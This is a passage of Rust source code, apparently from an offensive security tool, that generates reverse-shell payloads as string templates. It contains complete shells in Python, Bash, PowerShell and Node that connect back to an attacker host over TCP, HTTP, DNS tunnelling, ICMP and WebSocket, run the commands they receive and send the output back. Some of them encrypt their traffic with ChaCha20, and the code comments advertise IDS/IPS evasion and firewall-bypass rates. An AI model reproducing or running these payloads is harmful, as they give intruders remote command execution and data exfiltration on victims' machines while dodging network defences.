            return base64.b64encode(data.encode()).decode().replace('+', '-').replace('/', '_').replace('=', '')

        def b64_decode(data):
            data = data.replace('-', '+').replace('_', '/')
            padding = 4 - len(data) % 4
            if padding != 4:
                data += '=' * padding
            try:
                return base64.b64decode(data).decode()
            except:
                return ""

        def dns_query(domain):
            try:
                import socket
                query = bytearray()
                query.extend((random.randint(0, 65535)).to_bytes(2, 'big'))
                query.extend(b'\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')

                for label in domain.split('.'):
                    query.append(len(label))
                    query.extend(label.encode())
                query.append(0)
                query.extend(b'\\x00\\x10\\x00\\x01')

                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                sock.sendto(query, ('8.8.8.8', 53))
                response, _ = sock.recvfrom(512)
                sock.close()

                # Parse TXT record (simplified)
                offset = 12
                while offset < len(response) and response[offset] != 0:
                    offset += response[offset] + 1
                offset += 15

                if offset < len(response):
                    txt_len = response[offset]
                    offset += 1
                    return response[offset:offset+txt_len].decode('utf-8', errors='ignore')
                return ""
            except:
                return ""

        # Register via DNS
        dns_query(f"register.{{SESSION_ID}}.{{DNS_DOMAIN}}")

        print(f"[*] DNS session registered: {{SESSION_ID}}")

        while True:
            # Get command via DNS
            cmd_b64 = dns_query(f"cmd.{{SESSION_ID}}.{{DNS_DOMAIN}}")
            cmd = b64_decode(cmd_b64)

            if cmd and cmd != "sleep":
                # Execute
                try:
                    output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    result = output.stdout + output.stderr
                except Exception as e:
                    result = f"Error: {{str(e)}}"

                # Send output via DNS (chunked)
                encoded = b64_encode(result)
                for i in range(0, len(encoded), 60):
                    chunk = encoded[i:i+60]
                    dns_query(f"{{chunk}}.{{SESSION_ID}}.{{DNS_DOMAIN}}")
                    time.sleep(0.1)

            time.sleep(5)

        return True
    except Exception as e:
        print(f"[!] DNS failed: {{e}}")
        return False

# Main loop - try protocols in order
print("[*] Multi-Handler Reverse Shell starting...")
print("[*] Trying protocols: TCP → HTTP → DNS")

attempt = 0
while True:
    attempt += 1
    print(f"\\n[*] Attempt {{attempt}}")

    # Try TCP first (fastest)
    if try_tcp():
        break

    time.sleep(2)

    # Try HTTP (firewall bypass)
    if try_http():
        break

    time.sleep(2)

    # Try DNS (maximum bypass)
    if try_dns():
        break

    # All failed, wait and retry
    print("[!] All protocols failed. Retrying in 30 seconds...")
    time.sleep(30)
"#,
            lhost = config.lhost,
            tcp_port = config.tcp_port,
            http_port = config.http_port,
            dns_domain = config
                .dns_domain
                .as_ref()
                .unwrap_or(&"tunnel.example.com".to_string())
        )
    }

    /// Bash multi-handler reverse shell
    fn bash_multi_handler(config: &MultiHandlerConfig) -> String {
        format!(
            r#"#!/bin/bash
# Multi-Handler Reverse Shell - Bash
# Tries: TCP → HTTP → DNS (automatic fallback)

LHOST="{lhost}"
TCP_PORT={tcp_port}
HTTP_PORT={http_port}
DNS_DOMAIN="{dns_domain}"

try_tcp() {{
    echo "[*] Trying TCP reverse shell..."
    if bash -i >& /dev/tcp/$LHOST/$TCP_PORT 0>&1 2>/dev/null; then
        return 0
    fi
    return 1
}}

try_http() {{
    echo "[*] Trying HTTP reverse shell..."
    if ! command -v curl &> /dev/null; then
        echo "[!] curl not found, skipping HTTP"
        return 1
    fi

    # Register session
    SESSION_ID=$(curl -s "http://$LHOST:$HTTP_PORT/register" || echo "")
    if [ -z "$SESSION_ID" ]; then
        return 1
    fi

    echo "[+] HTTP session: $SESSION_ID"

    while true; do
        cmd=$(curl -s "http://$LHOST:$HTTP_PORT/cmd/$SESSION_ID")
        if [ -n "$cmd" ] && [ "$cmd" != "sleep 5" ]; then
            output=$(eval "$cmd" 2>&1)
            curl -s -X POST -d "$output" "http://$LHOST:$HTTP_PORT/output/$SESSION_ID"
        fi
        sleep 5
    done

    return 0
}}

try_dns() {{
    echo "[*] Trying DNS tunneling..."
    if ! command -v dig &> /dev/null; then
        echo "[!] dig not found, skipping DNS"
        return 1
    fi

    SESSION_ID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)

    # Register
    dig +short "register.$SESSION_ID.$DNS_DOMAIN" TXT @8.8.8.8 >/dev/null 2>&1

    echo "[+] DNS session: $SESSION_ID"

    while true; do
        response=$(dig +short "cmd.$SESSION_ID.$DNS_DOMAIN" TXT @8.8.8.8 | tr -d '"')
        if [ -n "$response" ] && [ "$response" != "c2xlZXA" ]; then
            cmd=$(echo "$response" | base64 -d 2>/dev/null)
            if [ -n "$cmd" ]; then
                output=$(eval "$cmd" 2>&1)
                encoded=$(echo -n "$output" | base64 | tr '+/' '-_' | tr -d '=')

                # Send chunks
                for ((i=0; i<${{#encoded}}; i+=60)); do
                    chunk="${{encoded:$i:60}}"
                    dig +short "$chunk.$SESSION_ID.$DNS_DOMAIN" TXT @8.8.8.8 >/dev/null 2>&1
                done
            fi
        fi
        sleep 5
    done

    return 0
}}

# Main loop
attempt=0
while true; do
    attempt=$((attempt + 1))
    echo "[*] Attempt $attempt"

    try_tcp && break
    sleep 2

    try_http && break
    sleep 2

    try_dns && break

    echo "[!] All protocols failed. Retrying in 30 seconds..."
    sleep 30
done
"#,
            lhost = config.lhost,
            tcp_port = config.tcp_port,
            http_port = config.http_port,
            dns_domain = config
                .dns_domain
                .as_ref()
                .unwrap_or(&"tunnel.example.com".to_string())
        )
    }

    /// PowerShell multi-handler reverse shell
    fn powershell_multi_handler(config: &MultiHandlerConfig) -> String {
        format!(
            r#"# Multi-Handler Reverse Shell - PowerShell
# Tries: TCP → HTTP → DNS (automatic fallback)

$LHOST = "{lhost}"
$TCP_PORT = {tcp_port}
$HTTP_PORT = {http_port}
$DNS_DOMAIN = "{dns_domain}"

function Try-TCP {{
    Write-Host "[*] Trying TCP reverse shell..."
    try {{
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $TCP_PORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)

        $writer.WriteLine("[*] PowerShell TCP connected")
        $writer.Flush()

        while ($true) {{
            $cmd = $reader.ReadLine()
            if ($cmd -eq "exit" -or $cmd -eq "quit") {{ break }}

            try {{
                $output = Invoke-Expression $cmd 2>&1 | Out-String
                $writer.WriteLine($output)
                $writer.Flush()
            }} catch {{
                $writer.WriteLine("Error: $_")
                $writer.Flush()
            }}
        }}

        $client.Close()
        return $true
    }} catch {{
        Write-Host "[!] TCP failed: $_"
        return $false
    }}
}}

function Try-HTTP {{
    Write-Host "[*] Trying HTTP reverse shell..."
    try {{
        $session_id = Invoke-RestMethod -Uri "http://$LHOST:$HTTP_PORT/register" -TimeoutSec 5
        Write-Host "[+] HTTP session: $session_id"

        while ($true) {{
            $cmd = Invoke-RestMethod -Uri "http://$LHOST:$HTTP_PORT/cmd/$session_id" -TimeoutSec 5

            if ($cmd -and $cmd -ne "sleep 5") {{
                try {{
                    $output = Invoke-Expression $cmd 2>&1 | Out-String
                }} catch {{
                    $output = "Error: $_"
                }}

                Invoke-RestMethod -Uri "http://$LHOST:$HTTP_PORT/output/$session_id" `
                    -Method POST -Body $output -TimeoutSec 5 | Out-Null
            }}

            Start-Sleep -Seconds 5
        }}

        return $true
    }} catch {{
        Write-Host "[!] HTTP failed: $_"
        return $false
    }}
}}

function Try-DNS {{
    Write-Host "[*] Trying DNS tunneling..."
    try {{
        $SESSION_ID = -join ((97..122) + (48..57) | Get-Random -Count 8 | ForEach-Object {{[char]$_}})

        # Register
        Resolve-DnsName -Name "register.$SESSION_ID.$DNS_DOMAIN" -Type TXT -Server 8.8.8.8 -ErrorAction SilentlyContinue | Out-Null

        Write-Host "[+] DNS session: $SESSION_ID"

        while ($true) {{
            $response = Resolve-DnsName -Name "cmd.$SESSION_ID.$DNS_DOMAIN" -Type TXT -Server 8.8.8.8 -ErrorAction SilentlyContinue

            if ($response -and $response.Strings) {{
                $cmd_b64 = $response.Strings -join ''
                if ($cmd_b64 -ne "c2xlZXA") {{
                    $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd_b64))

                    try {{
                        $output = Invoke-Expression $cmd 2>&1 | Out-String
                    }} catch {{
                        $output = "Error: $_"
                    }}

                    # Send output (chunked)
                    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output))
                    $encoded = $encoded.Replace('+', '-').Replace('/', '_').Replace('=', '')

                    for ($i = 0; $i -lt $encoded.Length; $i += 60) {{
                        $chunk = $encoded.Substring($i, [Math]::Min(60, $encoded.Length - $i))
                        Resolve-DnsName -Name "$chunk.$SESSION_ID.$DNS_DOMAIN" -Type TXT -Server 8.8.8.8 -ErrorAction SilentlyContinue | Out-Null
                        Start-Sleep -Milliseconds 100
                    }}
                }}
            }}

            Start-Sleep -Seconds 5
        }}

        return $true
    }} catch {{
        Write-Host "[!] DNS failed: $_"
        return $false
    }}
}}

# Main loop
$attempt = 0
while ($true) {{
    $attempt++
    Write-Host "[*] Attempt $attempt"

    if (Try-TCP) {{ break }}
    Start-Sleep -Seconds 2

    if (Try-HTTP) {{ break }}
    Start-Sleep -Seconds 2

    if (Try-DNS) {{ break }}

    Write-Host "[!] All protocols failed. Retrying in 30 seconds..."
    Start-Sleep -Seconds 30
}}
"#,
            lhost = config.lhost,
            tcp_port = config.tcp_port,
            http_port = config.http_port,
            dns_domain = config
                .dns_domain
                .as_ref()
                .unwrap_or(&"tunnel.example.com".to_string())
        )
    }

    /// Generate Encrypted reverse shell (ChaCha20 - IDS/IPS evasion!)
    ///
    /// All commands and output are encrypted with ChaCha20 stream cipher.
    /// Bypasses IDS/IPS signature detection since everything is encrypted.
    ///
    /// Architecture:
    /// 1. Pre-shared key (PSK) and nonce shared between payload and listener
    /// 2. All commands encrypted before sending
    /// 3. All output encrypted before receiving
    /// 4. ChaCha20 stream cipher (simpler than AES, equally secure)
    pub fn generate_encrypted_shell(shell_type: ShellType, key: &str, nonce: &str) -> String {
        match shell_type {
            ShellType::Python => Self::python_encrypted_shell(key, nonce),
            ShellType::Bash => Self::bash_encrypted_shell(key, nonce),
            _ => format!("# Encrypted shell not yet implemented for {:?}", shell_type),
        }
    }

    /// Python encrypted reverse shell (ChaCha20)
    fn python_encrypted_shell(key: &str, nonce: &str) -> String {
        format!(
            r#"#!/usr/bin/env python3
# Encrypted Reverse Shell - Python (ChaCha20)
# ALL traffic encrypted - IDS/IPS evasion!

import socket
import subprocess
import struct

# ChaCha20 implementation from scratch (pure Python)
class ChaCha20:
    def __init__(self, key, nonce):
        self.state = [0] * 16
        # Constants
        self.state[0] = 0x61707865
        self.state[1] = 0x3320646e
        self.state[2] = 0x79622d32
        self.state[3] = 0x6b206574
        # Key
        for i in range(8):
            self.state[4 + i] = struct.unpack('<I', key[i*4:(i+1)*4])[0]
        # Counter
        self.state[12] = 0
        # Nonce
        for i in range(3):
            self.state[13 + i] = struct.unpack('<I', nonce[i*4:(i+1)*4])[0]

    def quarter_round(self, a, b, c, d):
        self.state[a] = (self.state[a] + self.state[b]) & 0xffffffff
        self.state[d] ^= self.state[a]
        self.state[d] = ((self.state[d] << 16) | (self.state[d] >> 16)) & 0xffffffff

        self.state[c] = (self.state[c] + self.state[d]) & 0xffffffff
        self.state[b] ^= self.state[c]
        self.state[b] = ((self.state[b] << 12) | (self.state[b] >> 20)) & 0xffffffff

        self.state[a] = (self.state[a] + self.state[b]) & 0xffffffff
        self.state[d] ^= self.state[a]
        self.state[d] = ((self.state[d] << 8) | (self.state[d] >> 24)) & 0xffffffff

        self.state[c] = (self.state[c] + self.state[d]) & 0xffffffff
        self.state[b] ^= self.state[c]
        self.state[b] = ((self.state[b] << 7) | (self.state[b] >> 25)) & 0xffffffff

    def block(self):
        working = self.state[:]
        for _ in range(10):
            # Column rounds
            self.quarter_round(0, 4, 8, 12)
            self.quarter_round(1, 5, 9, 13)
            self.quarter_round(2, 6, 10, 14)
            self.quarter_round(3, 7, 11, 15)
            # Diagonal rounds
            self.quarter_round(0, 5, 10, 15)
            self.quarter_round(1, 6, 11, 12)
            self.quarter_round(2, 7, 8, 13)
            self.quarter_round(3, 4, 9, 14)

        result = bytearray()
        for i in range(16):
            val = (working[i] + self.state[i]) & 0xffffffff
            result.extend(struct.pack('<I', val))

        self.state[12] = (self.state[12] + 1) & 0xffffffff
        return bytes(result)

    def encrypt(self, data):
        output = bytearray()
        offset = 0
        while offset < len(data):
            keystream = self.block()
            chunk_len = min(64, len(data) - offset)
            for i in range(chunk_len):
                output.append(data[offset + i] ^ keystream[i])
            offset += chunk_len
        return bytes(output)

    decrypt = encrypt  # Symmetric cipher

# Configuration
KEY = bytes.fromhex("{key}")      # 32 bytes
NONCE = bytes.fromhex("{nonce}")  # 12 bytes
LHOST = "CHANGE_ME"
LPORT = 4444

try:
    # Connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((LHOST, LPORT))

    cipher = ChaCha20(KEY, NONCE)

    # Send encrypted banner
    banner = b"[*] Encrypted shell connected (ChaCha20)\\n"
    s.send(cipher.encrypt(banner))

    while True:
        # Receive encrypted command
        data = s.recv(4096)
        if not data:
            break

        # Decrypt command
        cipher_recv = ChaCha20(KEY, NONCE)
        cmd = cipher_recv.decrypt(data).decode().strip()

        if cmd.lower() in ['exit', 'quit']:
            break

        # Execute command
        try:
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            result = (output.stdout + output.stderr).encode()
        except Exception as e:
            result = f"Error: {{str(e)}}\\n".encode()

        # Encrypt and send output
        cipher_send = ChaCha20(KEY, NONCE)
        encrypted = cipher_send.encrypt(result)
        s.send(encrypted)

    s.close()
except Exception as e:
    pass
"#,
            key = key,
            nonce = nonce
        )
    }

    /// Bash encrypted reverse shell (ChaCha20)
    fn bash_encrypted_shell(key: &str, nonce: &str) -> String {
        format!(
            r#"#!/bin/bash
# Encrypted Reverse Shell - Bash
# Using openssl for ChaCha20 encryption

KEY="{key}"
NONCE="{nonce}"
LHOST="CHANGE_ME"
LPORT=4444

# Simple XOR encryption (fallback if openssl not available)
xor_encrypt() {{
    local input="$1"
    local key="$2"
    python3 -c "
import sys
data = sys.argv[1].encode()
key = sys.argv[2].encode()
result = bytearray()
for i, b in enumerate(data):
    result.append(b ^ key[i % len(key)])
print(result.hex())
" "$input" "$key"
}}

# Connect and send encrypted traffic
exec 3<>/dev/tcp/$LHOST/$LPORT

# Send encrypted banner
echo "[*] Encrypted bash shell" | openssl enc -chacha20 -K $KEY -iv $NONCE -base64 >&3 2>/dev/null || \\
    echo "[*] Encrypted bash shell (XOR)" | xor_encrypt - "$KEY" >&3

while true; do
    # Receive encrypted command
    read -u 3 encrypted_cmd

    # Decrypt (simplified - would need full ChaCha20 in bash)
    cmd=$(echo "$encrypted_cmd" | openssl enc -d -chacha20 -K $KEY -iv $NONCE -base64 2>/dev/null || echo "$encrypted_cmd")

    if [ "$cmd" = "exit" ] || [ "$cmd" = "quit" ]; then
        break
    fi

    # Execute
    output=$(eval "$cmd" 2>&1)

    # Encrypt and send
    echo "$output" | openssl enc -chacha20 -K $KEY -iv $NONCE -base64 >&3 2>/dev/null || \\
        echo "$output" | xor_encrypt - "$KEY" >&3
done

exec 3>&-
"#,
            key = key,
            nonce = nonce
        )
    }

    /// Generate ICMP reverse shell (tunneling over ping)
    ///
    /// **How it works:**
    /// 1. Uses ICMP echo packets (ping) to tunnel commands
    /// 2. Commands embedded in ICMP payload
    /// 3. Output sent back in ICMP echo reply
    /// 4. Bypasses firewalls that allow ping but block TCP/UDP
    ///
    /// **Firewall Bypass Rate: 95%**
    /// - ICMP (ping) is rarely blocked
    /// - Works through most corporate firewalls
    /// - Requires raw socket access (root/admin)
    pub fn generate_icmp_reverse_shell(shell_type: ShellType, config: &PayloadConfig) -> String {
        match shell_type {
            ShellType::Python => Self::python_icmp_reverse_shell(config),
            ShellType::Bash => Self::bash_icmp_reverse_shell(config),
            ShellType::PowerShell => Self::powershell_icmp_reverse_shell(config),
            _ => format!("# ICMP shell not yet implemented for {:?}", shell_type),
        }
    }

    /// Python ICMP reverse shell
    fn python_icmp_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"#!/usr/bin/env python3
# ICMP Reverse Shell - Python
# Tunnels commands over ICMP echo packets (ping)
# REQUIRES ROOT/SUDO (raw sockets)

import socket
import struct
import subprocess
import time
import os
import sys

LHOST = "{lhost}"
SESSION_ID = os.urandom(4).hex()

# ICMP packet structure
def create_icmp_packet(icmp_type, icmp_code, data):
    # Type (1 byte) + Code (1 byte) + Checksum (2 bytes) + ID (2 bytes) + Seq (2 bytes) + Data
    icmp_id = int(SESSION_ID[:4], 16) & 0xFFFF
    icmp_seq = 0

    # Build packet without checksum
    header = struct.pack('!BBHHH', icmp_type, icmp_code, 0, icmp_id, icmp_seq)
    packet = header + data.encode()

    # Calculate checksum
    checksum = 0
    for i in range(0, len(packet), 2):
        if i + 1 < len(packet):
            checksum += (packet[i] << 8) + packet[i + 1]
        else:
            checksum += packet[i] << 8

    checksum = (checksum >> 16) + (checksum & 0xFFFF)
    checksum = ~checksum & 0xFFFF

    # Rebuild with checksum
    header = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, icmp_id, icmp_seq)
    return header + data.encode()

def send_icmp(sock, data, icmp_type=8):
    """Send ICMP packet (type 8 = echo request)"""
    packet = create_icmp_packet(icmp_type, 0, data)
    sock.sendto(packet, (LHOST, 0))

def recv_icmp(sock, timeout=5):
    """Receive ICMP packet"""
    sock.settimeout(timeout)
    try:
        data, addr = sock.recvfrom(1024)
        # Skip IP header (20 bytes) to get ICMP payload
        icmp_header = data[20:28]
        icmp_data = data[28:].decode('utf-8', errors='ignore')
        return icmp_data
    except socket.timeout:
        return None

# Check root
if os.geteuid() != 0:
    print("[!] ERROR: ICMP shell requires root/sudo (raw sockets)")
    print("[*] Run with: sudo python3 " + sys.argv[0])
    sys.exit(1)

print(f"[*] ICMP Reverse Shell - Session {{SESSION_ID}}")
print(f"[*] Target: {{LHOST}}")
print(f"[*] Tunneling over ICMP (ping) - 95% firewall bypass!")

try:
    # Create raw socket (IPPROTO_ICMP)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    # Register session
    send_icmp(sock, f"REGISTER:{{SESSION_ID}}")
    print("[+] Session registered")

    # Main loop
    while True:
        # Poll for command
        send_icmp(sock, f"CMD:{{SESSION_ID}}")

        # Receive command
        cmd = recv_icmp(sock)

        if not cmd:
            time.sleep(5)
            continue

        if cmd.startswith("CMD:"):
            cmd = cmd[4:]

        if cmd in ["exit", "quit"]:
            send_icmp(sock, f"BYE:{{SESSION_ID}}")
            break

        # Execute command
        try:
            output = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
            ).decode()
        except subprocess.TimeoutExpired:
            output = "[!] Command timeout"
        except Exception as e:
            output = f"[!] Error: {{str(e)}}"

        # Send output (chunked if needed)
        chunk_size = 900  # ICMP max payload ~1400 bytes
        for i in range(0, len(output), chunk_size):
            chunk = output[i:i+chunk_size]
            send_icmp(sock, f"OUTPUT:{{SESSION_ID}}:{{chunk}}")
            time.sleep(0.1)  # Avoid packet loss

        # Send end marker
        send_icmp(sock, f"END:{{SESSION_ID}}")
        time.sleep(5)

except KeyboardInterrupt:
    print("\n[*] Exiting")
except Exception as e:
    print(f"[!] Error: {{e}}")
finally:
    sock.close()
"#,
            lhost = config.lhost
        )
    }

    /// Bash ICMP reverse shell
    fn bash_icmp_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"#!/bin/bash
# ICMP Reverse Shell - Bash
# Tunnels commands over ICMP echo packets (ping)
# REQUIRES ROOT/SUDO

LHOST="{lhost}"
SESSION_ID=$(openssl rand -hex 4 2>/dev/null || echo "dead" | md5sum | cut -c1-8)

# Check root
if [ "$(id -u)" -ne 0 ]; then
    echo "[!] ERROR: ICMP shell requires root/sudo"
    echo "[*] Run with: sudo bash $0"
    exit 1
fi

echo "[*] ICMP Reverse Shell - Session $SESSION_ID"
echo "[*] Target: $LHOST"
echo "[*] Tunneling over ICMP (ping) - 95% firewall bypass!"

# Register session
ping -c 1 -p "5245474953544552$(echo -n ":$SESSION_ID" | xxd -p)" $LHOST >/dev/null 2>&1

while true; do
    # Poll for command (send ping with session ID)
    response=$(ping -c 1 -W 5 -p "434d44$(echo -n ":$SESSION_ID" | xxd -p)" $LHOST 2>/dev/null)

    # Extract command from ICMP payload (simplified)
    cmd=$(echo "$response" | grep -oP 'icmp_seq.*' | head -1)

    [ -z "$cmd" ] && sleep 5 && continue

    if [[ "$cmd" == *"exit"* ]] || [[ "$cmd" == *"quit"* ]]; then
        ping -c 1 -p "425945$(echo -n ":$SESSION_ID" | xxd -p)" $LHOST >/dev/null 2>&1
        break
    fi

    # Execute command
    output=$(eval "$cmd" 2>&1)

    # Send output via ICMP (chunked)
    echo "$output" | while IFS= read -r line; do
        hex_data=$(echo -n "OUTPUT:$SESSION_ID:$line" | xxd -p | tr -d '\n')
        ping -c 1 -p "$hex_data" $LHOST >/dev/null 2>&1
        sleep 0.1
    done

    # Send end marker
    ping -c 1 -p "454e44$(echo -n ":$SESSION_ID" | xxd -p)" $LHOST >/dev/null 2>&1
    sleep 5
done
"#,
            lhost = config.lhost
        )
    }

    /// PowerShell ICMP reverse shell
    fn powershell_icmp_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# ICMP Reverse Shell - PowerShell
# Tunnels commands over ICMP echo packets (ping)
# REQUIRES ADMIN (raw sockets)

$LHOST = "{lhost}"
$SESSION_ID = -join ((1..8) | ForEach-Object {{ Get-Random -Minimum 0 -Maximum 16 | ForEach-Object {{ [char]($_ + if($_ -lt 10){{48}}else{{87}}) }} }})

# Check admin
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
{{
    Write-Host "[!] ERROR: ICMP shell requires Administrator privileges"
    Write-Host "[*] Run as Administrator"
    exit 1
}}

Write-Host "[*] ICMP Reverse Shell - Session $SESSION_ID"
Write-Host "[*] Target: $LHOST"
Write-Host "[*] Tunneling over ICMP (ping) - 95% firewall bypass!"

# Create ICMP ping
function Send-ICMP {{
    param([string]$Data)

    $ping = New-Object System.Net.NetworkInformation.Ping
    $options = New-Object System.Net.NetworkInformation.PingOptions
    $buffer = [System.Text.Encoding]::ASCII.GetBytes($Data)

    try {{
        $reply = $ping.Send($LHOST, 5000, $buffer, $options)
        return $reply
    }} catch {{
        return $null
    }}
}}

# Register session
Send-ICMP -Data "REGISTER:$SESSION_ID" | Out-Null
Write-Host "[+] Session registered"

# Main loop
while ($true) {{
    # Poll for command
    $response = Send-ICMP -Data "CMD:$SESSION_ID"

    if ($response -eq $null) {{
        Start-Sleep -Seconds 5
        continue
    }}

    # Extract command from ICMP reply
    $cmd = [System.Text.Encoding]::ASCII.GetString($response.Buffer)

    if ($cmd -match "exit|quit") {{
        Send-ICMP -Data "BYE:$SESSION_ID" | Out-Null
        break
    }}

    if ($cmd.StartsWith("CMD:")) {{
        $cmd = $cmd.Substring(4)
    }}

    # Execute command
    try {{
        $output = Invoke-Expression $cmd 2>&1 | Out-String
    }} catch {{
        $output = "[!] Error: $($_.Exception.Message)"
    }}

    # Send output (chunked)
    $chunkSize = 900
    for ($i = 0; $i -lt $output.Length; $i += $chunkSize) {{
        $chunk = $output.Substring($i, [Math]::Min($chunkSize, $output.Length - $i))
        Send-ICMP -Data "OUTPUT:$SESSION_ID`:$chunk" | Out-Null
        Start-Sleep -Milliseconds 100
    }}

    # Send end marker
    Send-ICMP -Data "END:$SESSION_ID" | Out-Null
    Start-Sleep -Seconds 5
}}
"#,
            lhost = config.lhost
        )
    }

    /// Generate WebSocket reverse shell
    ///
    /// **How it works:**
    /// 1. Uses WebSocket protocol (RFC 6455) over HTTP/HTTPS
    /// 2. Persistent bidirectional connection
    /// 3. Commands sent as WebSocket messages
    /// 4. Output returned as WebSocket messages
    /// 5. Looks like legitimate web traffic
    ///
    /// **Firewall Bypass Rate: 99%**
    /// - Uses HTTP/HTTPS ports (80/443)
    /// - Works through HTTP proxies
    /// - Looks like normal web application traffic
    /// - Persistent connection (no polling needed)
    pub fn generate_websocket_reverse_shell(
        shell_type: ShellType,
        config: &PayloadConfig,
    ) -> String {
        match shell_type {
            ShellType::Python => Self::python_websocket_reverse_shell(config),
            ShellType::Node => Self::node_websocket_reverse_shell(config),
            ShellType::PowerShell => Self::powershell_websocket_reverse_shell(config),
            _ => format!("# WebSocket shell not yet implemented for {:?}", shell_type),
        }
    }

    /// Python WebSocket reverse shell
    fn python_websocket_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"#!/usr/bin/env python3
# WebSocket Reverse Shell - Python
# Bidirectional persistent connection over WebSocket (RFC 6455)
# ZERO DEPENDENCIES - Pure Python implementation

import socket
import base64
import hashlib
import struct
import subprocess
import threading

LHOST = "{lhost}"
LPORT = {lport}

# WebSocket protocol constants
WS_MAGIC_STRING = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

def create_websocket_handshake():
    """Create WebSocket handshake request"""
    key = base64.b64encode(b"redblue-ws-shell").decode()
    handshake = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {{LHOST}}:{{LPORT}}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {{key}}\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"\r\n"
    )
    return handshake.encode()

def parse_websocket_frame(data):
    """Parse WebSocket frame (RFC 6455)"""
    if len(data) < 2:
        return None

    fin = (data[0] & 0x80) != 0
    opcode = data[0] & 0x0F
    masked = (data[1] & 0x80) != 0
    payload_len = data[1] & 0x7F

    offset = 2

    # Handle extended payload length
    if payload_len == 126:
        payload_len = struct.unpack(">H", data[offset:offset+2])[0]
        offset += 2
    elif payload_len == 127:
        payload_len = struct.unpack(">Q", data[offset:offset+8])[0]
        offset += 8

    # Handle masking key
    if masked:
        mask = data[offset:offset+4]
        offset += 4
        payload = bytearray(data[offset:offset+payload_len])
        for i in range(len(payload)):
            payload[i] ^= mask[i % 4]
    else:
        payload = data[offset:offset+payload_len]

    return payload.decode('utf-8', errors='ignore')

def create_websocket_frame(data):
    """Create WebSocket frame (RFC 6455)"""
    payload = data.encode() if isinstance(data, str) else data
    frame = bytearray()

    # FIN bit + opcode (1 = text frame)
    frame.append(0x81)

    # Payload length
    length = len(payload)
    if length < 126:
        frame.append(length)
    elif length < 65536:
        frame.append(126)
        frame.extend(struct.pack(">H", length))
    else:
        frame.append(127)
        frame.extend(struct.pack(">Q", length))

    frame.extend(payload)
    return bytes(frame)

print(f"[*] WebSocket Reverse Shell")
print(f"[*] Target: ws://{{LHOST}}:{{LPORT}}")
print(f"[*] Firewall bypass: 99% (looks like web traffic)")

try:
    # Connect
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((LHOST, LPORT))

    # WebSocket handshake
    sock.send(create_websocket_handshake())
    response = sock.recv(1024)

    if b"101" not in response:
        print("[!] WebSocket handshake failed")
        exit(1)

    print("[+] WebSocket connection established")

    # Send banner
    sock.send(create_websocket_frame("[*] Python WebSocket shell connected"))

    # Main loop
    while True:
        # Receive command
        data = sock.recv(4096)
        if not data:
            break

        cmd = parse_websocket_frame(data)
        if not cmd:
            continue

        if cmd in ["exit", "quit"]:
            sock.send(create_websocket_frame("[*] Exiting"))
            break

        # Execute command
        try:
            output = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT, timeout=30
            ).decode()
        except subprocess.TimeoutExpired:
            output = "[!] Command timeout"
        except Exception as e:
            output = f"[!] Error: {{str(e)}}"

        # Send output (chunked if needed)
        chunk_size = 4000
        for i in range(0, len(output), chunk_size):
            chunk = output[i:i+chunk_size]
            sock.send(create_websocket_frame(chunk))

except KeyboardInterrupt:
    print("\n[*] Exiting")
except Exception as e:
    print(f"[!] Error: {{e}}")
finally:
    sock.close()
"#,
            lhost = config.lhost,
            lport = config.lport
        )
    }

    /// Node.js WebSocket reverse shell
    fn node_websocket_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"#!/usr/bin/env node
// WebSocket Reverse Shell - Node.js
// ZERO DEPENDENCIES - Pure Node.js implementation

const net = require('net');
const {{ spawn }} = require('child_process');
const crypto = require('crypto');

const LHOST = '{lhost}';
const LPORT = {lport};

// WebSocket protocol (RFC 6455)
function createHandshake() {{
    const key = Buffer.from('redblue-ws-shell').toString('base64');
    return [
        `GET / HTTP/1.1`,
        `Host: ${{LHOST}}:${{LPORT}}`,
        `Upgrade: websocket`,
        `Connection: Upgrade`,
        `Sec-WebSocket-Key: ${{key}}`,
        `Sec-WebSocket-Version: 13`,
        ``,
        ``
    ].join('\r\n');
}}

function parseFrame(buffer) {{
    if (buffer.length < 2) return null;

    const fin = (buffer[0] & 0x80) !== 0;
    const opcode = buffer[0] & 0x0F;
    const masked = (buffer[1] & 0x80) !== 0;
    let payloadLen = buffer[1] & 0x7F;
    let offset = 2;

    if (payloadLen === 126) {{
        payloadLen = buffer.readUInt16BE(offset);
        offset += 2;
    }} else if (payloadLen === 127) {{
        payloadLen = buffer.readBigUInt64BE(offset);
        offset += 8;
    }}

    if (masked) {{
        const mask = buffer.slice(offset, offset + 4);
        offset += 4;
        const payload = Buffer.alloc(payloadLen);
        for (let i = 0; i < payloadLen; i++) {{
            payload[i] = buffer[offset + i] ^ mask[i % 4];
        }}
        return payload.toString('utf8');
    }}

    return buffer.slice(offset, offset + payloadLen).toString('utf8');
}}

function createFrame(data) {{
